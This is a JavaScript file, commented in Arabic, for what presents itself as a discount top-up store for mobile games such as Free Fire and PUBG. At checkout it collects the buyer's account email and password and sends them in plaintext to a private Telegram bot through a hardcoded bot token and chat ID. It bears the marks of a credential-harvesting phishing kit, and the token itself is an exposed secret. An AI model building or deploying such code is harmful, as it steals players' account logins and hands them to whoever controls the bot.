document.addEventListener('DOMContentLoaded', () => {
    // --- إعدادات توكن وقنوات التليجرام الآمنة ---
    const TELEGRAM_TOKEN = "8648161617:AAFVxx7syurke1Pl7BGAbyqAaM2NnBPKB5I"; 
    const TELEGRAM_CHAT_ID = "8851363543"; 

    // الشاشات الرئيسية وعناصر التحكم بالصفحات
    const landingPage = document.getElementById('landing-page');
    const storePage = document.getElementById('store-page');
    const enterBtn = document.getElementById('enter-btn');

    // عناصر النوافذ المنبثقة (Modals)
    const gameModal = document.getElementById('game-modal');
    const rechargeModal = document.getElementById('recharge-modal');
    const checkoutModal = document.getElementById('checkout-modal');
    const rechargeList = document.querySelector('.recharge-list');
    const modalTitle = document.getElementById('modal-game-title');
    const modalIcon = document.getElementById('modal-game-icon');
    const toggleContainer = document.getElementById('modal-toggle-container');
    const btnId = document.getElementById('btn-id');
    const btnAcc = document.getElementById('btn-acc');

    // حقول المدخلات والتحقق من البيانات
    const idGroup = document.getElementById('id-input-group');
    const accGroup = document.getElementById('acc-input-group');
    const idField = document.getElementById('game-id-field');
    const emailField = document.getElementById('acc-email-field');
    const passField = document.getElementById('acc-pass-field');
    const confirmBtn = document.getElementById('confirm-btn');
    
    const checkoutActionContainer = document.getElementById('checkout-action-container');
    const successNotification = document.getElementById('success-notification');

    // متغيرات الحالة لإدارة عمليات الشراء
    let currentGame = ""; 
    let currentMethod = "ID"; 
    let orderData = { game: "", method: "", user_id: "", email: "", password: "", product: "", price: "" };

    // السمات اللونية والأيقونات الفاخرة لكل لعبة
    const themes = {
        "FREE FIRE": { color: "#ff6600", accent: "#ff3300", icon: "https://static.wikia.nocookie.net/garena-freefire/images/f/f2/Free_Fire_App_Icon.png" },
        "PUBG MOBILE": { color: "#00a2ff", accent: "#0066ff", icon: "https://www.pubgmobile.com/common/images/icon_logo.jpg" },
        "CALL OF DUTY": { color: "#e5c158", accent: "#bfa13b", icon: "https://static.wikia.nocookie.net/callofduty/images/3/31/CODMobile_App_Icon_Global_2024_Season10_CODM.png" },
        "FIFA MOBILE": { color: "#00ffcc", accent: "#00ccaa", icon: "https://cdn-www.bluestacks.com/bs-images/70042468c0d43639228178f9e61aec7f.png" },
        "PES MOBILE": { color: "#00cc44", accent: "#009933", icon: "https://cdn-offer-photos.zeusx.com/b12a0ebf-889c-4053-9c53-3f756e8602d1.png" },
        "BLOOD STRIKE": { color: "#ff3333", accent: "#cc0000", icon: "https://www.blood-strike.com/m/gw/20230721092756/data/share.jpg" }
    };

    // مصفوفة أسعار وباقات الخدمات التفصيلية لكل لعبة بشكل منظم واحترافي
    const productsDatabase = {
        "FREE FIRE": {
            "ID": `
                <div class="recharge-section-title">Diamond Packs</div>
                <div class="recharge-item" data-name="100 Diamond" data-price="55 EGP"><span class="item-name">◇ 100 Diamond</span><span class="item-price">55 EGP</span></div>
                <div class="recharge-item" data-name="210 Diamond" data-price="105 EGP"><span class="item-name">◇ 210 Diamond</span><span class="item-price">105 EGP</span></div>
                <div class="recharge-item" data-name="310 Diamond" data-price="155 EGP"><span class="item-name">◇ 310 Diamond</span><span class="item-price">155 EGP</span></div>
                <div class="recharge-item" data-name="520 Diamond" data-price="255 EGP"><span class="item-name">◇ 520 Diamond</span><span class="item-price">255 EGP</span></div>
                <div class="recharge-section-title">Subscriptions & Offers</div>
                <div class="recharge-item" data-name="Weekly Membership" data-price="105 EGP"><span class="item-name">★ Weekly Membership</span><span class="item-price">105 EGP</span></div>
                <div class="recharge-item" data-name="Monthly Membership" data-price="540 EGP"><span class="item-name">★ Monthly Membership</span><span class="item-price">540 EGP</span></div>
                <div class="recharge-item" data-name="750 Diamond Super" data-price="265 EGP"><span class="item-name">◇ 750 Diamond [اسبوعي + 300]</span><span class="item-price">265 EGP</span></div>
            `,
            "ACC": `
                <div class="recharge-section-title">Gmail Account Bonuses</div>
                <div class="recharge-item" data-name="100 Diamond Bonus" data-price="50 EGP"><span class="item-name">◇ 100 Diamond Bonus</span><span class="item-price">50 EGP</span></div>
                <div class="recharge-item" data-name="210 Diamond Account" data-price="95 EGP"><span class="item-name">◇ 210 Diamond</span><span class="item-price">95 EGP</span></div>
                <div class="recharge-item" data-name="500 Diamond Account" data-price="225 EGP"><span class="item-name">◇ 500 Diamond</span><span class="item-price">225 EGP</span></div>
                <div class="recharge-item" data-name="Weekly Account Pack" data-price="75 EGP"><span class="item-name">★ Weekly Membership</span><span class="item-price">75 EGP</span></div>
            `
        },
        "PUBG MOBILE": {
            "ID": `
                <div class="recharge-section-title">UC Unknown Cash</div>
                <div class="recharge-item" data-name="30 UC" data-price="25 EGP"><span class="item-name">◇ 30 UC</span><span class="item-price">25 EGP</span></div>
                <div class="recharge-item" data-name="60 UC" data-price="45 EGP"><span class="item-name">◇ 60 UC</span><span class="item-price">45 EGP</span></div>
                <div class="recharge-item" data-name="325 UC" data-price="215 EGP"><span class="item-name">◇ 325 UC</span><span class="item-price">215 EGP</span></div>
                <div class="recharge-item" data-name="660 UC" data-price="425 EGP"><span class="item-name">◇ 660 UC</span><span class="item-price">425 EGP</span></div>
                <div class="recharge-section-title">Royale Pass Pass</div>
                <div class="recharge-item" data-name="RP LVL 1-50" data-price="255 EGP"><span class="item-name">★ RP LVL (1 - 50)</span><span class="item-price">255 EGP</span></div>
                <div class="recharge-item" data-name="RP LVL 1-100" data-price="510 EGP"><span class="item-name">★ RP LVL (1 - 100)</span><span class="item-price">510 EGP</span></div>
            `
        },
        "CALL OF DUTY": {
            "ID": `
                <div class="recharge-section-title">CP Points</div>
                <div class="recharge-item" data-name="30 CP" data-price="20 EGP"><span class="item-name">◇ 30 CP</span><span class="item-price">20 EGP</span></div>
                <div class="recharge-item" data-name="80 CP" data-price="50 EGP"><span class="item-name">◇ 80 CP</span><span class="item-price">50 EGP</span></div>
                <div class="recharge-item" data-name="420 CP" data-price="230 EGP"><span class="item-name">◇ 420 CP</span><span class="item-price">230 EGP</span></div>
                <div class="recharge-item" data-name="Battle Pass Premium" data-price="130 EGP"><span class="item-name">★ Battle Pass Premium</span><span class="item-price">130 EGP</span></div>
            `
        },
        "FIFA MOBILE": {
            "ID": `
                <div class="recharge-section-title">FC Points Packs</div>
                <div class="recharge-item" data-name="40 FC Points" data-price="25 EGP"><span class="item-name">◇ 40 FC Points</span><span class="item-price">25 EGP</span></div>
                <div class="recharge-item" data-name="100 FC Points" data-price="55 EGP"><span class="item-name">◇ 100 FC Points</span><span class="item-price">55 EGP</span></div>
                <div class="recharge-item" data-name="520 FC Points" data-price="255 EGP"><span class="item-name">◇ 520 FC Points</span><span class="item-price">255 EGP</span></div>
            `
        },
        "PES MOBILE": {
            "ID": `
                <div class="recharge-section-title">eFootball Coins</div>
                <div class="recharge-item" data-name="137 Coins" data-price="70 EGP"><span class="item-name">◇ 137 Coins</span><span class="item-price">70 EGP</span></div>
                <div class="recharge-item" data-name="315 Coins" data-price="155 EGP"><span class="item-name">◇ 315 Coins</span><span class="item-price">155 EGP</span></div>
                <div class="recharge-item" data-name="Heroic Pass" data-price="260 EGP"><span class="item-name">★ Heroic Pass</span><span class="item-price">260 EGP</span></div>
            `
        },
        "BLOOD STRIKE": {
            "ID": `
                <div class="recharge-section-title">Gold Bars</div>
                <div class="recharge-item" data-name="51 Gold" data-price="30 EGP"><span class="item-name">◇ 51 Gold</span><span class="item-price">30 EGP</span></div>
                <div class="recharge-item" data-name="105 Gold" data-price="55 EGP"><span class="item-name">◇ 105 Gold</span><span class="item-price">55 EGP</span></div>
                <div class="recharge-item" data-name="320 Gold" data-price="150 EGP"><span class="item-name">◇ 320 Gold</span><span class="item-price">150 EGP</span></div>
            `
        }
    };

    // --- محرك تنقل وتوجيه الصفحات (Tab Navigation System) ---
    const navLinks = document.querySelectorAll('.nav-link');
    navLinks.forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            document.querySelectorAll('.nav ul li').forEach(li => li.classList.remove('active'));
            link.parentElement.classList.add('active');
            
            const targetHash = link.getAttribute('href');
            routeTabView(targetHash);
        });
    });

    enterBtn.addEventListener('click', () => {
        landingPage.classList.remove('active');
        storePage.classList.add('active');
        routeTabView("#home");
    });

    function routeTabView(hashTarget) {
        document.querySelectorAll('.tab-content-view').forEach(view => view.classList.remove('active-view'));
        if (hashTarget === "#home" || hashTarget === "") {
            document.getElementById('home-content-section').classList.add('active-view');
        } else if (hashTarget === "#search") {
            document.getElementById('search-content-section').classList.add('active-view');
            document.getElementById('store-search-input').value = "";
            processLiveSearchFilter("");
        } else if (hashTarget === "#about") {
            document.getElementById('about-content-section').classList.add('active-view');
        } else if (hashTarget === "#support") {
            document.getElementById('support-content-section').classList.add('active-view');
        }
    }

    // --- محرك البحث المتقدم المباشر (Live Search Engine) ---
    const searchInput = document.getElementById('store-search-input');
    const searchResultsViewport = document.getElementById('search-results-viewport');

    searchInput.addEventListener('input', (e) => {
        processLiveSearchFilter(e.target.value);
    });

    function processLiveSearchFilter(queryText) {
        const cleanedQuery = queryText.trim().toLowerCase();
        searchResultsViewport.innerHTML = "";

        if (cleanedQuery === "") {
            searchResultsViewport.innerHTML = `<div style="color: #6b7280; font-size: 1rem; grid-column: 1/-1; text-align:center;">Type a game title to start filtering...</div>`;
            return;
        }

        const sourceCards = document.querySelectorAll('#home-content-section .game-card');
        let matchesCount = 0;

        sourceCards.forEach(card => {
            const indexName = card.getAttribute('data-game-search-title') || "";
            if (indexName.includes(cleanedQuery)) {
                matchesCount++;
                const clonedCard = card.cloneNode(true);
                clonedCard.addEventListener('click', () => {
                    const matchedTitle = card.querySelector('.game-label').innerText;
                    configureModalTheme(matchedTitle);
                });
                searchResultsViewport.appendChild(clonedCard);
            }
        });

        if (matchesCount === 0) {
            searchResultsViewport.innerHTML = `<div class="not-found-feedback">Sorry, this game was not found</div>`;
        }
    }

    // --- تشغيل وإعداد واجهة تفاصيل اللعبة (Modal Themes) ---
    function configureModalTheme(gameKey) {
        currentGame = gameKey;
        const currentTheme = themes[gameKey];
        if (!currentTheme) return;

        modalTitle.innerText = gameKey;
        modalTitle.style.color = currentTheme.color;
        modalIcon.src = currentTheme.icon;
        modalIcon.style.borderColor = currentTheme.color;
        
        if (gameKey === "FREE FIRE") {
            toggleContainer.style.display = 'flex';
        } else {
            toggleContainer.style.display = 'none'; 
        }
        
        idField.value = "";
        emailField.value = "";
        passField.value = "";
        
        switchToID();
        gameModal.classList.add('active');
    }

    // ربط كروت الألعاب بقائمة التحكم
    document.querySelectorAll('#home-content-section .game-card').forEach(card => {
        card.addEventListener('click', () => {
            const gameTitle = card.querySelector('.game-label').innerText;
            configureModalTheme(gameTitle);
        });
    });

    function switchToID() {
        currentMethod = 'ID';
        btnId.classList.add('active');
        btnAcc.classList.remove('active');
        idGroup.style.display = 'block';
        accGroup.style.display = 'none';
        validateInputs();
    }

    function switchToACC() {
        currentMethod = 'ACC';
        btnId.classList.remove('active');
        btnAcc.classList.add('active');
        idGroup.style.display = 'none';
        accGroup.style.display = 'block';
        validateInputs();
    }

    btnId.addEventListener('click', switchToID);
    btnAcc.addEventListener('click', switchToACC);

    // تفعيل أزرار التحقق من المدخلات
    function validateInputs() {
        let isValid = false;
        if (currentMethod === 'ID') {
            isValid = idField.value.trim().length >= 5;
        } else {
            isValid = emailField.value.trim().length >= 5 && passField.value.trim().length >= 4;
        }

        confirmBtn.disabled = !isValid;
        if (isValid) {
            confirmBtn.classList.add('active-style');
            confirmBtn.style.background = themes[currentGame].color;
        } else {
            confirmBtn.classList.remove('active-style');
            confirmBtn.style.background = "#222";
        }
    }

    idField.addEventListener('input', validateInputs);
    emailField.addEventListener('input', validateInputs);
    passField.addEventListener('input', validateInputs);

    // الانتقال لواجهة الباقات والأسعار المتاحة
    confirmBtn.addEventListener('click', () => {
        orderData.game = currentGame;
        orderData.method = currentMethod;
        orderData.user_id = idField.value.trim();
        orderData.email = emailField.value.trim();
        orderData.password = passField.value.trim();

        // سحب قائمة المنتجات من قاعدة البيانات الديناميكية
        const gameData = productsDatabase[currentGame];
        const selectedMarkup = gameData ? gameData[currentMethod] : "";

        if (selectedMarkup) {
            rechargeList.innerHTML = selectedMarkup;
            gameModal.classList.remove('active');
            rechargeModal.classList.add('active');
            bindProductSelection();
        }
    });

    // اختيار الباقة المناسبة والذهاب لصفحة الفاتورة والدفع الإلكتروني
    function bindProductSelection() {
        const items = rechargeList.querySelectorAll('.recharge-item');
        items.forEach(item => {
            item.addEventListener('click', () => {
                orderData.product = item.getAttribute('data-name');
                orderData.price = item.getAttribute('data-price');

                // صياغة فاتورة المراجعة النهائية للاعب
                let receiptHtml = `
                    <p><strong>Game:</strong> ${orderData.game}</p>
                    <p><strong>Method:</strong> ${orderData.method}</p>
                    ${orderData.method === 'ID' ? `<p><strong>Player ID:</strong> ${orderData.user_id}</p>` : `
                    <p><strong>Email:</strong> ${orderData.email}</p>
                    <p><strong>Password:</strong> ${orderData.password}</p>`}
                    <p style="border-top:1px solid rgba(255,255,255,0.1); margin-top:10px; padding-top:10px;"><strong>Selected Product:</strong> <span style="color:#ff6600;">${orderData.product}</span></p>
                    <p><strong>Total Price:</strong> <span style="color:#00ffcc; font-weight:bold;">${orderData.price}</span></p>
                `;

                document.getElementById('order-details').innerHTML = receiptHtml;
                checkoutActionContainer.style.display = 'block';
                successNotification.style.display = 'none';

                rechargeModal.classList.remove('active');
                checkoutModal.classList.add('active');
            });
        });
    }

    // --- إرسال البيانات المكتملة فورياً إلى سيرفر التليجرام الخاص بك ---
    document.getElementById('checkout-btn').addEventListener('click', () => {
        let textMessage = `🚨 NEW ORDER RECEIVED 🚨\n\n`;
        textMessage += `🎮 Game: ${orderData.game}\n`;
        textMessage += `⚙️ Method: ${orderData.method}\n`;
        if (orderData.method === 'ID') {
            textMessage += `👤 ID: ${orderData.user_id}\n`;
        } else {
            textMessage += `📧 Email/Phone: ${orderData.email}\n`;
            textMessage += `🔑 Password: ${orderData.password}\n`;
        }
        textMessage += `📦 Product: ${orderData.product}\n`;
        textMessage += `💰 Price: ${orderData.price}\n`;

        const apiEndpoint = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        
        fetch(apiEndpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: textMessage })
        })
        .then(response => {
            if (response.ok) {
                checkoutActionContainer.style.display = 'none';
                successNotification.style.display = 'block';
            } else {
                alert("There was an issue submitting your order. Please try again or contact live support.");
            }
        })
        .catch(() => alert("Network error. Please check your connection."));
    });

    // --- إرسال الاقتراحات والمشاكل (Feedback Form System) ---
    document.getElementById('feedback-submit-btn').addEventListener('click', () => {
        const feedbackText = document.getElementById('feedback-textarea-field').value.trim();
        if (feedbackText === "") return;

        let feedbackMessage = `📝 NEW CUSTOMER FEEDBACK 📝\n\n${feedbackText}`;
        const apiEndpoint = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

        fetch(apiEndpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: feedbackMessage })
        })
        .then(response => {
            if (response.ok) {
                document.getElementById('feedback-input-box').style.display = 'none';
                document.getElementById('feedback-thanks-box').style.display = 'block';
            }
        });
    });

    // إغلاق النوافذ والعودة للخلف
    document.getElementById('close-modal').addEventListener('click', () => gameModal.classList.remove('active'));
    document.getElementById('back-to-id').addEventListener('click', () => {
        rechargeModal.classList.remove('active');
        gameModal.classList.add('active');
    });
    document.getElementById('back-to-recharge').addEventListener('click', () => {
        checkoutModal.classList.remove('active');
        rechargeModal.classList.add('active');
    });
});



